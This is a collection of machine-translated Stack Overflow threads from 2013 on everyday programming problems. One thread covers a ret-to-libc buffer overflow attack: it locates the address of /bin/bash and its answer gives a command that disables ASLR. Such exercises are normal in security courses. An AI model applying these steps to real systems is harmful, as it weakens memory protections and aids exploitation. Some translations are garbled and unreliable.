# [1] 737 717 692 697 697 672 722 707 687 
```

# php - date() 函数输出错误结果 - PHP

> ID：14853275
> 
> 赞同：0
> 
> 时间：2013-02-13T12:10:21.640
> 
> 标签：php, date, epoch

这就是我所做的-：

1.  在 mysql 中生成 UNIX_TIMESTAMP 结果。`1360756718`几秒钟就出来了 。
2.  因为我在 GMT +5.30，所以得到了 5 小时 30 分钟的秒数。结果是`19800`几秒钟
3.  运行此函数-> date('j MYH:i:s',(1360756718+19800))。

但不幸的是，答案`1 hour`早于原来的时间。我的意思是准确`1 hour`的。结果`13 Feb 2013 18:28:38`应该是`13 Feb 2013 17:28:38`。

我在哪里穿？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:16:17.200

好吧，您在 +5:30，但由于夏令时，我们仍然落后 1 小时。所以你现在只有 +4:30

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:14:32.113

我认为您的时区设置不正确。您需要挖掘您的 Apache/PHP/Mysql 设置以找出它的设置。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T12:16:29.327

```
echo date( 'd.m.Y H:i:s', '1360756718' ); // 13.02.2013 13:58:38
echo date( 'd.m.Y H:i:s',  ( '1360756718'+19800 ) ); // 13.02.2013 19:28:38 
```

对我来说，这是按计划完成的。你确定你是从正确的时间开始的吗？正如一些已经提到的，问题很可能在于您的时区或夏令时。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-13T12:17:51.577

请先检查您当前的时区。 [在这里您也可以检查所有支持的时区](http://php.net/timezones)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-13T12:22:02.147

您可以尝试添加：

```
ini_set('date.timezone', 'My/Timezone'); 
```

从 php 5.1 开始，也可以这样做：

```
date_default_timezone_set ( string $timezone_identifier ) 
```

[http://www.php.net/manual/en/function.date-default-timezone-set.php](http://www.php.net/manual/en/function.date-default-timezone-set.php)

将时间设置为您自己的时区。可用于 php 的时区在这里：

[http://www.php.net/manual/en/timezones.php](http://www.php.net/manual/en/timezones.php)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-02-13T12:48:45.183

其他答案说您应该检查并更正您的时区设置。我会这样做，因为它更正确（关于夏令时等）。

如果您想使用简单的方法尝试 gmdate 功能：

```
string gmdate ( string $format [, int $timestamp = time() ] ) 
```

这将始终以 GMT 计算 - 您不必检查服务器设置。（但是它也会忽略夏令时。）

# iphone - 无法在 xmpp 聊天应用中注册用户

> ID：14853276
> 
> 赞同：1
> 
> 时间：2013-02-13T12:10:29.940
> 
> 标签：iphone, ios, chat

我想在我的 iOS 应用程序中实现 XMPP 框架，我已经完成了所有的事情（与其他用户聊天，显示其他用户的存在等）

但问题是，我无法从我的应用程序中注册新用户。我为此使用以下代码，

```
if ([appDel.xmppStream supportsInBandRegistration])
    [appDel.xmppStream registerWithPassword:txt_Password.text error:nil]; 
```

但是为此，supportsInBandRegistration 方法总是返回 NO 并且我不会被称为方法 never registerWithPassword: 。

如果有任何可用的解决方案，请帮助我

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-13T12:20:19.893

你用的是什么服务器？一些服务器支持带内注册，即使它们没有发送正确的流：根据 XEP-0077 的功能。然而，他们中的大多数人应该在迪斯科结果中给出该功能。

---- OR ---- 您可以通过以下代码解决此问题。它对我来说很好。：

```
- (void)xmppStream:(XMPPStream *)sender didNotAuthenticate: 
(NSXMLElement *)error; 
{ 
NSLog(@"Did not authenticate"); 

 [xmppStream registerWithPassword:[[NSUserDefaults 
standardUserDefaults] stringForKey:@"userPassword"] error:nil]; 

NSError * err = nil; 

if(![[self xmppStream] registerWithPassword:password error:&err]) 
{ 
    NSLog(@"Error registering: %@", err); 
} 

} 
- (void)xmppStreamDidRegister:(XMPPStream *)sender{ 

NSLog(@"I'm in register method"); 

    } 

- (void)xmppStream:(XMPPStream *)sender didNotRegister:(NSXMLElement 
*)error{ 
NSLog(@"Sorry the registration is failed"); 

} 
```

我在 didNotAuthenticate: 方法中声明了 registerWithPassword:error: 方法，因为在连接到服务器后，它将通过我的注册方法正常工作的地方进入这个 didNotAuthenticate 方法

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-13T08:14:41.390

我遇到了同样的问题，即`[xmppStream supportsInBandRegistration]`方法返回 false，因为我正在传递已经在服务器中注册的 Jid。

```
[xmppStream setMyJID:[XMPPJID jidWithString:jabberID]]; 
```

更改 JID 对我有用。

# bash - 查找 /bin/bash 的地址进行缓冲区溢出攻击

> ID：14853277
> 
> 赞同：0
> 
> 时间：2013-02-13T12:10:38.223
> 
> 标签：bash, buffer-overflow

我正在尝试 ret-to-libc 攻击并使用以下代码来获取环境变量 /bin/bash 的地址

```
#include <unistd.h>
int main(void)
{

  printf("bash address: 0x%lx\n", getenv("SHELL"));
 return 0;
} 
```

当我使用gdb的x命令检查这段代码返回的地址是否正确时，它第一次显示正确。但是当执行其他一些程序时，这个地址会自动改变。我应该怎么做才能保持这个环境变量的地址不变？我将这个地址用于缓冲区溢出，但由于每次运行它都会不断变化，因此攻击永远不会成功。有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2019-04-06T17:52:37.440

您必须禁用 ASLR 才能使地址不变。

```
echo 0 | tee /proc/sys/kernel/randomize_va_space 
```

# wpf - WPF中DataGrid的TextWrapping只显示2行

> ID：14853280
> 
> 赞同：0
> 
> 时间：2013-02-13T12:10:50.797
> 
> 标签：wpf, wpfdatagrid

```
<DataGrid  Grid.Row="3"  AutoGenerateColumns="False" Height="auto" x:Name="grdData" TabIndex="2"  VerticalAlignment="Stretch" HorizontalAlignment="Stretch" Background="Transparent"   VerticalContentAlignment="Center" HorizontalContentAlignment="Stretch" PreviewKeyDown="grdData_KeyDown" MouseDoubleClick="grdData_MouseDoubleClick" Margin="5">
            <DataGrid.Columns>
                <DataGridTextColumn Width="100"  Header="Code"  IsReadOnly="True" />
                <DataGridTextColumn Width="*"  Header="Name"  IsReadOnly="True">
                <DataGridTextColumn.ElementStyle>
                    <Style TargetType="TextBlock">
                            <Setter Property="TextWrapping" Value="Wrap"/>
                    </Style>
                    </DataGridTextColumn.ElementStyle>
                </DataGridTextColumn>
            </DataGrid.Columns> 
```

我在 WPF 中对 DataGrid 的 TextWrapping 有问题，它只显示 2 行。

如果我增加网格行高，我可以看到我的文字。有什么帮助吗？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-14T09:19:30.530

**感谢上帝，我在 Window 的构造函数中解决了它 set dataGrid.RowHeight = double.NaN;**

# actionscript-3 - NetStream.time 从连接相机时开始，而不是从调用 NetStream.publish 时开始

> ID：14853282
> 
> 赞同：2
> 
> 时间：2013-02-13T12:10:52.687
> 
> 标签：actionscript-3, flash-media-server, netstream

我在 AS3 项目中从网络摄像头录制到 AMS，为了从麦克风获取音量级别，我必须将麦克风连接到 NetStream。稍后当用户开始记录时，NetStream.time 值从连接相机时开始计算，而不是从调用 NetStream.publish 时开始计算。如果他们停止录制并再次录制，现在 NetStream.time 从 0 开始。到目前为止，解决这个问题的唯一方法似乎是调用发布，然后在连接麦克风后立即关闭 NetStream。AS2 NetStream 的文档提到了这一事实，并建议调用在 AS3 中不起作用的 NetStream.publish(false)，也不能只调用没有参数的发布。

```
ns = new NetStream(nc);
ns.attachCamera(cam);
ns.attachAudio(mic); 
```

然后稍后

```
ns.publish(filename,"record");
trace(ns.time); 
```

是连接相机和第一次调用发布之间经过的时间。

到目前为止我唯一的解决方案是

```
ns = new NetStream(nc);
ns.attachCamera(cam);
ns.attachAudio(mic);
ns.publish(filename,"record");
ns.close(); 
```

用户开始重新排序的时间

```
ns.publish(filename,"record");
trace(ns.time); 
```

ns.time 现在为零。我错过了什么，有更好的解决方案吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T09:39:36.107

您可以使用 mic.setLoopBack(true)，它将麦克风活动路由到您的扬声器。您现在将能够看到活动级别。但是你可能想在音量为 0 的麦克风上设置 soundTransform，这样麦克风就会被有效地静音。

基本上。

mic.setLoopBack(true);

var transform:SoundTransform = new SoundTransfrom(); 变换.体积 = 0;

mic.soundTransform = 变换；

停止显示活动级别后，请确保删除转换。

# c# - 使用 lambda 表达式从一个列表中的一个列表中获取值

> ID：14853285
> 
> 赞同：0
> 
> 时间：2013-02-13T12:10:59.287
> 
> 标签：c#, linq, lambda

我是 lambda 表达式的新手，所以我尝试解决一个问题。但我不能。所以任何人都可以为此提出解决方案。

我有一类客户。在里面我创建了另外 3 个类并为 3 个类创建了 observable 集合。我为这个客户创建了一个 observable 集合

```
ObservableCollection<Customer> customer2;

   public class Customer
    {
        public string CusName { get; set; }
        public int CusAge { get; set; }
        public ObservableCollection<Bankdetails> bankdetails;
        public ObservableCollection<order> orderlist;
        public ObservableCollection<orderdetails> orderdetailslist;

        public class Bankdetails
        {
            public string Bankaccno { get; set; }
            public string bankname { get; set; }
            public int bankid { get; set; }
        }

        public class order
        {
            public string ordername { get; set; }
            public string orderid { get; set; }

        }

        public class orderdetails
        {
            public string orderid { get; set; }
            public string itemname { get; set; }
            public int itemqty { get; set; }

        }

    } 
```

我写了一个 linq 查询来从 customer2 中获取值。无论如何它的工作原理。像这样我试图写一个 lambda 查询，但我不能。

在这里，我向 observable 集合添加了一些值。

```
 customer2 = new ObservableCollection<Customer>
        {
            new Customer()
        {
            CusName="nixon",CusAge=24,
            bankdetails=new ObservableCollection<Customer.Bankdetails>
            {
                new Customer.Bankdetails()
                {
                    bankid=12,bankname="axis",Bankaccno="09876534"
                }
            },
            orderlist=new ObservableCollection<Customer.order>
            {
                new Customer.order
                {
                    orderid="Od123",ordername="Express"
                }
            },
            orderdetailslist=new ObservableCollection<Customer.orderdetails>
            {
                new Customer.orderdetails
                {
                    orderid="Od123",itemname="cpu",itemqty=5
                }
            }

        }
            }; 
```

这是我的 linq 查询

```
 var customer1 = from cus in customer2
                      from bank in cus.bankdetails
                      from ord in cus.orderlist
                      from orddet in cus.orderdetailslist
                      where ord.orderid == orddet.orderid 

                      select new
                      {
                          cus.CusAge,cus.CusName,
                          bank.Bankaccno,bank.bankid,bank.bankname,
                          ord.ordername,
                          orddet.itemname,orddet.itemqty

                      }; 
```

那么 lambda 查询将是什么。请任何人建议。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-13T13:57:58.693

马特的解决方案从问题扩展`where`为：

```
var xxx = customer2.SelectMany(cus =>
    cus.bankdetails.SelectMany(bank => 
        cus.orderlist.SelectMany(ord => 
           cus.orderdetailslist.Where(orddet => orddet.orderid == ord.orderid)
              .Select(orddet => new
                {
                    cus.CusAge,
                    cus.CusName,
                    bank.Bankaccno,
                    bank.bankname,
                    orddet.itemname,
                    orddet.itemqty
                }
            )
        )
    )
); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-13T12:27:39.707

```
var xxx = customer2.SelectMany(cus =>
    cus.bankdetails.SelectMany(bank => 
        cus.orderlist.SelectMany(ord => 
            cus.orderdetailslist.Select(orddet => new
                {
                    cus.CusAge,
                    cus.CusName,
                    bank.Bankaccno,
                    bank.bankname,
                    orddet.itemname,
                    orddet.itemqty
                }
            )
        )
    )
); 
```

# visual-studio-2012 - EF 5 Code First 与 SQL Server Express 2012 和 Visual Studio 2012

> ID：14853286
> 
> 赞同：0
> 
> 时间：2013-02-13T12:11:02.407
> 
> 标签：visual-studio-2012, entity-framework-5, sql-server-express

我就是不能让它工作。我查看了所有其他相关线程，但没有一个对我有用。这是我目前的连接字符串：

```
<add name='UniContext' connectionString='Server=.\SQLEXPRESS;Database=ContosoUni;Integrated Security=SSPI;User Instance=true' providerName='System.Data.EntityClient'/> 
```

我得到的错误是：

![在此处输入图像描述](../Images/d97c87543a3a91ef3f6dda68da3adb25.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:14:08.377

尝试将提供程序名称从 System.Data.EntityClient 更改为 System.Data.SqlClient

# java - HashSet 正在添加重复的 ChannelSftp.LsEntry

> ID：14853289
> 
> 赞同：0
> 
> 时间：2013-02-13T12:11:13.870
> 
> 标签：java, hashset, jsch

我正在尝试使用 jsch 库通过 sftp 下载文件。我成功地做到了，但我只想下载尚未下载的文件。我正在收集条目列表，并尝试实现一个哈希集来检查它们是否已经下载。问题是，它正在向哈希集添加重复项并重新下载所有文件。下面是我编写的代码（嗯，重要的部分）。

```
Vector<ChannelSftp.LsEntry> list = sftpChannel.ls("*.gz");

for (ChannelSftp.LsEntry entry : list) {
    if (set.add(entry)) {
        sftpChannel.get(entry.getFilename(), fileDestination); 
    }
} 
```

这一切都在一个方法中。所以，当我再次调用该方法时，它应该只下载我之前没有下载的文件。但是，它没有这样做。有什么建议么？如果我需要澄清任何事情，请告诉我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:15:33.597

而不是`entry`添加`entry.getFilename()`到`set`：

```
if (set.add(entry.getFilename())) {
    sftpChannel.get(entry.getFilename(), fileDestination); 
} 
```

我在这里假设的是`getFilename`返回 a`String`并且您的应用程序允许`set`定义这样的 a 。

这有效的原因（如果假设正确）是因为`equals`定义良好`String`，这不会让两个相同的名称（相同的字符序列）以相同的`set`.

但是，如果您不能修改`set`您应该覆盖`hashCode`并`equals`反映`ChannelSftp.LsEntry`您认为使两个`LsEntry`对象*相等*的内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:21:38.793

请覆盖 hashCode() 和 equals() 方法以解决 HashSet 上的重复问题

# java - parser.setFeature 与 parser.setValidating

> ID：14853292
> 
> 赞同：3
> 
> 时间：2013-02-13T12:11:22.873
> 
> 标签：java, xml-parsing, xsd, dtd, xml

以下有什么区别：

```
parser.setFeature("http://xml.org/sax/features/validation",true);
and
parser.setFeature("http://apache.org/xml/features/validation/schema",true);
and
parser.setValidating(true); 
```

我在谷歌搜索中找到了两次确切的问题，但没有找到答案

我正在使用 org.apache.commons.digester，我在消化器上调用 setFeature 或 setValidating。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-06-27T09:42:28.573

我正在寻找同一个问题的答案。您可能已经找到了答案，但对于像我这样到达此线程的其他人。

据我所知，它是特定于实现的。SAX 似乎并没有真正的规范（规范是他们的网站 saxproject.org）。至少我在规范或 javadoc（也许我忽略了）中没有找到任何 isValidating 应该与验证功能同步的参考。

```
public boolean isValidating()
Indicates if this SAXParserFactory is configured to produce parsers that validate
XML documents as they are parsed. 
```

但是，例如，如果您查看 Xerces 的实现：[org.apache.xerces.jaxp.SAXParserFactoryImpl](https://svn.apache.org/repos/asf/xerces/java/trunk/src/org/apache/xerces/jaxp/SAXParserFactoryImpl.java)，您会注意到它们在内部使用验证设置 ( `isValidation`, `setValidating`) 来实现验证功能。

*   设置功能

    ```
    else if (name.equals(VALIDATION_FEATURE)) {
        setValidating(value);
        return;
    } 
    ```

*   获取特征

    ```
    else if (name.equals(VALIDATION_FEATURE)) {
        return isValidating();
    } 
    ```

或者，如果您查看 Sun 源

```
public void setValidating(boolean validating) {
    putInFeatures(VALIDATION_FEATURE, validating);
} 
```

（示例来自 openjdk-6-src-b31-15_apr_2014）

另一个是来自[Oracle XDK的 oracle xmlparserv2](http://www.oracle.com/technetwork/database/database-technologies/xmldb/xdk-java-082884.html)

一些示例测试来证明这一点（您需要 oracle xmlparserv2 jar，并且您还需要一个 META-INF/services/javax.xml.parsers.SAXParserFactory 文件，`org.apache.xerces.jaxp.SAXParserFactoryImpl`因为 oracle jar 是……相当占主导地位）

```
public class SaxParserTest {
    @Test
    public void validationFeatureTestXerces() throws Exception {
        SAXParserFactory parserFactory = org.apache.xerces.jaxp.SAXParserFactoryImpl.newInstance();

        parserFactory.setFeature("http://xml.org/sax/features/validation", false);
        Assert.assertFalse(parserFactory.isValidating());
        parserFactory.setFeature("http://xml.org/sax/features/validation", true);
        Assert.assertTrue(parserFactory.isValidating());

        parserFactory.setValidating(true);
        Assert.assertTrue(parserFactory.getFeature("http://xml.org/sax/features/validation"));
        parserFactory.setValidating(false);
        Assert.assertFalse(parserFactory.getFeature("http://xml.org/sax/features/validation"));
    }

    @Test
    public void validationFeatureTestOracle() throws Exception {
        SAXParserFactory parserFactory = oracle.xml.jaxp.JXSAXParserFactory.newInstance();

        parserFactory.setFeature("http://xml.org/sax/features/validation", false);
        Assert.assertFalse(parserFactory.isValidating());
        parserFactory.setFeature("http://xml.org/sax/features/validation", true);
        Assert.assertTrue(parserFactory.isValidating());

        parserFactory.setValidating(true);
        Assert.assertTrue(parserFactory.getFeature("http://xml.org/sax/features/validation"));
        parserFactory.setValidating(false);
        Assert.assertFalse(parserFactory.getFeature("http://xml.org/sax/features/validation"));
    }

} 
```

# c++ - Ncurses：创建下一个窗口后无法在上一个窗口中写入

> ID：14853293
> 
> 赞同：0
> 
> 时间：2013-02-13T12:11:25.853
> 
> 标签：c++, c, ncurses

我创建了两个 Ncurses 窗口：窗口 1 和窗口 2。我可以在调用窗口 2 之前写入窗口 1；但是，在调用 Window 2 之后，我无法使用 mvwprinw(window1, "Bla") 写入 Window 1。为了显示：

```
...

initscr();
Window* window1 = newwin(10,10,0,0);
mvwprinw(window1, "i am writing to window");    // this works
wrefresh(window1);

Window* window2 = newwin(10,10, 12, 12);
mvwprintw(window2, "whee");             //works too
wrefresh(window2);

mvwprintw(window1, 0,0,"writing new sentence");     
// this does not show on the screen
wrefresh(window1);

... 
```

为什么呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:45:44.037

解决了：

如果有人遇到类似问题，请注意多个 C++ 类中的编码窗口。

在其中一个类中构建了一个侦听器类。但是，它称为无限循环（不是设计代码的最佳方式，但对于程序来说已经足够了）。

因此，代码陷入了无限循环，导致下一行代码保持未执行状态。

解决方案：如有必要，请使用多线程库。

# ruby - 如何比较哈希和输出重复项？

> ID：14853295
> 
> 赞同：-1
> 
> 时间：2013-02-13T12:11:39.033
> 
> 标签：ruby, hash

我有三个散列，并想输出它们共有的键：

```
hash1 = {a: "3", b: "2" c: "1"}
hash2 = {b: "2" c: "1"}
hash3 = {b: "2" c: "1", d: "4"} 
```

对于上面的示例，公共键是`b`and `c`。

我需要将其扩展到许多哈希值。最有效和可扩展的方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:20:02.313

是的，你需要类似的东西`Hash#intersect`。幸运的是，实现起来很简单。

```
class Hash
  def & another
    result = {}
    self.each do |k, v|
      result[k] = v if another[k] == v
    end
    result
  end
end

hash1 = {a: "3", b: "2", c: "1"}
hash2 = {b: "2", c: "1"}
hash3 = {b: "2", c: "1", d: "4"}

hashes = [hash1, hash2, hash3]

hashes.reduce(:&) # => {:b=>"2", :c=>"1"} 
```

**注意：**此代码假定键**及其**对应的值必须匹配才能通过过滤器。如果您只对键本身感兴趣，那么很容易修改代码来做到这一点。我会把它留给你。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-13T12:17:21.583

```
> hashes = [{a: 3, b: 4}, {a: 5, c: 6}, {a: 6, d: 2}]
=> [{:a=>3, :b=>4}, {:a=>5, :c=>6}, {:a=>6, :d=>2}]
> hashes.map(&:keys).inject { |shared, keys| shared & keys }
=> [:a] 
```

# jquery - 无法让 jQuery 验证插件工作

> ID：14853297
> 
> 赞同：0
> 
> 时间：2013-02-13T12:11:54.900
> 
> 标签：jquery, jquery-validate

我无法让 jQuery 的验证插件正常工作。我成功地引入了 jquery.js 和 jquery.validate.js。我的脚本如下：

```
$(document).ready(function($) {

    $("#apply").validate({
        rules: {
            firstname: "required",
            surname: "required",

            secret: {
                required: true,
                minlength: 5
            },
            verify_secret: {
                required: true,
                minlength: 5,
                equalTo: "#secret"
            },
            email: {
                required: true,
                email: true
            },

        },
        messages: {
            firstname: "Please enter your firstname",
            surname: "Please enter your surname",

            secret: {
                required: "Please provide a password",
                minlength: "Your password must be at least 5 characters long"
            },
            verify_secret: {
                required: "Please provide a password",
                minlength: "Your password must be at least 5 characters long",
                equalTo: "Please enter the same password as above"
            },
            email: "Please enter a valid email address",

        }
    });

}); 
```

这是我的标记：

```
 <form method="post" action="apply.php" id='apply'>

        <input type='text' name='firstname' id='firstname' value=''/>
        <input type='text' name='surname' id='surname' value=' '/>

<input type='text' name='email' id='email' value='Your Email Address'/>

        <label for='secret'>Your Chosen Password</label>
        <input type='password' name='secret' id='secret'/>

        <label for='verify_secret'>Verify Your Password</label>
        <input type='password' name='verify_secret' id='verify_secret'/>

        <input type='submit' name='submit' value='Submit'/>
    </form> 
```

我缺少一些依赖项吗？我没有收到任何错误消息或任何其他可能帮助我解决问题的信息。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T15:58:58.703

[根据 jQuery 文档](http://api.jquery.com/ready/)，`$().ready(function() {`“***不****推荐*”。

由于您没有提及其他 JavaScript 库也在`$`您的页面上使用该变量，或者任何关于使用[noConflict() 模式](http://api.jquery.com/jQuery.noConflict/)的内容，因此只需使用标准`document.ready`函数*而不*将多余的内容传递给`$`它。

```
$(document).ready(function() { ... }); 
```

这是您的代码的工作演示...

**[http://jsfiddle.net/9ZVab/](http://jsfiddle.net/9ZVab/)**

我还发现/删除了几个尾随逗号。我注意到您在两个密码字段上有相同的规则。由于第二个字段正在使用该`equalTo`规则，因此其他规则是多余的，可以删除。见：http: [//jsfiddle.net/tnuQa/](http://jsfiddle.net/tnuQa/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:14:22.700

而不是这个，我不明白你为什么这样使用jquery？

```
$().ready(function($) { 
```

尝试

```
$(document).ready(function() { 
```

# javascript - 子窗口关闭时如何提交父窗口表单

> ID：14853304
> 
> 赞同：0
> 
> 时间：2013-02-13T12:12:18.693
> 
> 标签：javascript, asp.net, gridview

我有一个`gridview`显示在一个页面中，该页面也有一个链接。当我单击链接时，`showModalDialog()`将打开一个我可以在其中编辑值的地方。之后，当按下更新按钮时，数据库中的值正在更新，我的子表单完美关闭。但我也需要更新我的父页表。这样新值就会反映在父表单中。我在子窗口中尝试了以下操作。
`<body onunload="window.opener.document.forms[0].submit();">`
但这行不通。给我一个好的解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:17:24.727

您在模态对话框中没有 onUnload

```
var res = showModalDialog(...); // execution is blocked until modal is closed
if (res) location.reload(1); // res contains what dialog set returnValue to 
```

在模态对话框中你做

```
window.returnValue=true; // if ok submission
window.close(); // will return control to opening window 
```

无论如何，你向右看了吗？关于gridviews和modal dialogs有很多重复的问题

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:17:34.787

我猜你有一个更新按钮点击的功能，它更新数据库并关闭表单，你可以在关闭窗口之前将该代码（你有卸载的那个）放在那个函数中

# asp.net-mvc - 多对多关系/实体框架数据库首先使用 MVC 4 Internet 应用程序

> ID：14853305
> 
> 赞同：0
> 
> 时间：2013-02-13T12:12:18.847
> 
> 标签：asp.net-mvc, entity-framework, many-to-many, database-first

我首先使用带有 VS 2012 和实体（5.0）框架数据库的 MVC 4 Internet 应用程序。

我用关系创建了我的数据库..

我创建了 ADO.NET 实体数据模型。我可以看到所有关系（一对一、一对多、多对多）。

我想使用“具有读/写操作的 mvc 控制器和使用实体框架的视图”创建我的控制器和视图。一对多和一对一没有问题。

多对多怎么样？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T13:34:20.713

您可以通过右键单击您的项目->实体框架->首先从代码进行逆向工程，从您的数据库中对您的 db.context 进行逆向工程（如果您安装了实体框架 nuget 包）。

要启用此选项，请先安装 - [Entity Framework Power Tools](http://visualstudiogallery.msdn.microsoft.com/72a60b14-1581-4b9b-89f2-846072eff19d)

设置相当简单，但这样的指南可能会有所帮助 ->[设置教程](http://romiller.com/2012/05/09/customizing-reverse-engineer-code-first-in-the-ef-power-tools/)

这将自动设置您的数据库上下文映射，因为它们在您的数据库中。创建的表映射包含关系代码。

我的应用程序的表中有一个多对多的关系，这很好用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-08T09:21:19.753

所有类似的问题都与 ViewModel 相关。

[http://msdn.microsoft.com/en-us/vs2010trainingcourse_aspnetmvc3fundamentals_topic7.aspx](http://msdn.microsoft.com/en-us/vs2010trainingcourse_aspnetmvc3fundamentals_topic7.aspx)

# arrays - 如何将提取的数组中的数据写入文件

> ID：14853307
> 
> 赞同：0
> 
> 时间：2013-02-13T12:12:21.437
> 
> 标签：arrays, file

我正在从数组中提取数据，目的是将其写入文件以供以后使用。

提取工作正常， print_r 语句的结果为我提供了所需的数据。但是，输出到文件的数据只会让我得到提取数据的最后一个值。

我错过了什么？我尝试过爆炸，将 print_r 的结果保存到字符串中，尝试输出缓冲 start_ob() 都没有结果。

```
 $url = "http://api.discogs.com/users/xxxxxx/collection/folders/0/releases?per_page=100&page=1";
    $json = json_decode(file_get_contents($url));

//  Scan through outer loop
    foreach ($json as $inner) {

// scan through inner loop
      foreach ($inner as $value) {
//get thumb url
         $thumb = $value->basic_information->thumb;
//Remove -150 from thumb url to gain full image url
          $image =  str_replace("-150","",($thumb));

// Write it to file
     file_put_contents("file.txt",$image);
     print_r($image);

    }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:16:02.787

您使用最后提取的数据一遍又一遍地重写文件。所以你需要将数据附加到图像变量，最后你需要把它放在磁盘上。

```
 $url = "http://api.discogs.com/users/xxxxxx/collection/folders/0/releases?per_page=100&page=1";
    $json = json_decode(file_get_contents($url));

//  Scan through outer loop
    foreach ($json as $inner) {

// scan through inner loop
      foreach ($inner as $value) {
//get thumb url
         $thumb = $value->basic_information->thumb;         
//Remove -150 from thumb url to gain full image url 
// and append it to image
          $image .=  str_replace("-150","",($thumb));  
// you can add ."\n" to add new line, like:
//$image .=  str_replace("-150","",($thumb))."\n";  
// Write it to file    

    }
    }

     file_put_contents("file.txt",$image);
     print_r($image); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:19:57.367

从 `file_put_contents()`手册

[http://www.php.net/manual/en/function.file-put-contents.php](http://www.php.net/manual/en/function.file-put-contents.php)

该函数与调用 相同`fopen()`，`fwrite()`依次`fclose()`将数据写入文件。

如果文件名不存在，则创建文件。否则，现有文件将被覆盖，除非`FILE_APPEND`设置了标志。

因此，您可以在现有代码中使用标志`FILE_APPEND`来停止每次写入时重写文件，或者像以前的评论者所说的那样累积字符串并写入一次（他们的方式更快更好）

# r - R - 为每个子集的第一行创建一个包含条目的列

> ID：14853308
> 
> 赞同：3
> 
> 时间：2013-02-13T12:12:23.577
> 
> 标签：r

例如，如果我有这些数据：

```
ID  Value   
1   2
1   2
1   3
1   4
1   10
2   9
2   9
2   12
2   13 
```

我的目标是找到每个 ID 子集的最小值，并且我希望该数字位于 ID 组的第一行，而其他行留空，例如：

```
ID  Value   Start
1   2       2
1   2       
1   3       
1   4       
1   10      
2   9       9
2   9       
2   12      
2   13 
```

我的第一直觉是使用为 ID 创建索引

```
A <- transform(A, INDEX=ave(ID, ID, FUN=seq_along)) ## A being the name of my data 
```

由于我是菜鸟，所以我被困在这一点上。对于每个 ID=n，我想找到该 ID 子集的 min(A$Value)，并将其放入 ID=n 和 INDEX=1 的单元格匹配条件中。

任何帮助深表感谢！很抱歉我一直在问问题:(

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:20:00.497

这是一个解决方案：

```
within(A, INDEX <- "is.na<-"(ave(Value, ID, FUN = min), c(FALSE, !diff(ID))))

  ID Value INDEX
1  1     2     2
2  1     2    NA
3  1     3    NA
4  1     4    NA
5  1    10    NA
6  2     9     9
7  2     9    NA
8  2    12    NA
9  2    13    NA 
```

**更新：**

*这个怎么运作？*该命令`ave(Value, ID, FUN = min)`将函数应用于 的`min`每个子集`Value`的值`ID`。例如，它返回一个由五次`2`和四次组成的向量`9`。由于每个子集中除第一个之外的所有值都应为`NA`，因此该函数`"is.na<-"`将替换由 定义的逻辑索引处的所有值`c(FALSE, !diff(ID))`。这个索引是`TRUE`如果一个值与前一个值相同。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T12:23:47.667

您快到了。我们只需要创建一个自定义函数来代替`seq_along`and 来分割（而不是`value`by ）。`ID``ID``ID`

```
first_min <- function(x){
  nas <- rep(NA, length(x))
  nas[which.min(x)] <- min(x, na.rm=TRUE)
  nas
} 
```

此函数生成一个 NA 向量，并将第一个元素替换为 的最小值`Value`。

```
transform(dat, INDEX=ave(Value, ID, FUN=first_min)) 

##   ID Value INDEX
## 1  1     2     2
## 2  1     2    NA
## 3  1     3    NA
## 4  1     4    NA
## 5  1    10    NA
## 6  2     9     9
## 7  2     9    NA
## 8  2    12    NA
## 9  2    13    NA 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T12:30:09.627

您可以使用 tapply one-liner 来实现这一点

```
df$Start<-as.vector(unlist(tapply(df$Value,df$ID,FUN = function(x){ return (c(min(x),rep("",length(x)-1)))}))) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-11-20T16:03:46.667

我一直回到这个问题，上面的答案对我帮助很大。初学者也有一个基本的解决方案：

`A$Start<-NA A[!duplicated(A$ID),]$Start<-A[!duplicated(A$ID),]$Value`

谢谢。

# java - Drools 中类型不安全的对象字段访问

> ID：14853310
> 
> 赞同：2
> 
> 时间：2013-02-13T12:12:26.600
> 
> 标签：java, drools

我正在使用一个系统，其中插入 Drools 引擎的一些数据遵循以下（严重过度简化）格式：

```
public class Item {
    public String getValueType() { ... }
    public Object getValue() { ... }
} 
```

这些值可能是几种不同的类型。现在，我想创建一堆 Drools 规则来检查值的各个字段，类似于：

```
$a : Item(valueType == "Car", value.owner.location == "At Home")
